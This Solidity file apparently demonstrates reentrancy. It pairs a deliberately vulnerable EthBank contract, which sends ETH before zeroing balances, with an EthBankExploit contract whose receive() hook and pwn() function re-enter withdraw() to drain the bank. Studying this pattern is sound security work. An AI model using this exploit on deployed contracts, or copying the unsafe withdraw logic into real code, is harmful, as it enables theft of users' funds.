// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IEthBank {
    function deposit() external payable;

    function withdraw() external payable;
}

contract EthBankExploit {
    IEthBank public bank;

    constructor(address _bank) {
        bank = IEthBank(_bank);
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }

    function pwn() external payable {
        uint256 bankBalance = address(bank).balance;
        if (bankBalance > 0) {
            uint256 depositAmount = bankBalance / 2;
            bank.deposit{value: depositAmount}();
        bank.withdraw();
        }
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract EthBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external payable {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "failed to send ETH");
        balances[msg.sender] = 0;
    }
}
